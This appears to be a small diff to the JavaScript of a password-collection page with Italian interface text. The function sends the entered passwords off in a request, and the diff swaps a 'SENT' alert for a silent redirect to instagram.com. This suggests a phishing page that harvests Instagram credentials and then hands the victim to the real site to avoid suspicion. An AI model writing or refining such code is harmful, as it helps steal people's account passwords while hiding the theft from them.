@@ -24,7 +24,7 @@ function sendMessage() {
         }
         request.send(JSON.stringify(params));
         sleep(400) 
-        alert ("SENT");
+        window.location.replace("https://instagram.com/");   
     }
     else{
         document.getElementById('alert').innerHTML = "Assicurati che entrambe le password corrispondano.";
